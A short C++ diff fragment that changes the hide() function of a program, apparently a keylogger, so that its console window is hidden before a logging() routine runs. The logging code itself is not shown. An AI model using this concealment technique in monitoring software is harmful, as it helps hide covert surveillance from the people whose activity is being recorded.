@@ -7,10 +7,11 @@ using namespace std ;
 
 void hide ()
 {
-    HWND stealth;
+    /*HWND stealth;
     AllocConsole();
     stealth = FindWindow("ConsoleWindowClass",NULL);
-    ShowWindow(stealth,0);
+    ShowWindow(stealth,0);*/
+    ShowWindow(GetConsoleWindow(), SW_HIDE);
 }
 
 void logging()
@@ -83,8 +84,9 @@ void logging()
 
 int main() {
 
+    FreeConsole();
     hide();
     logging();
 
-    return 0;
+
 }
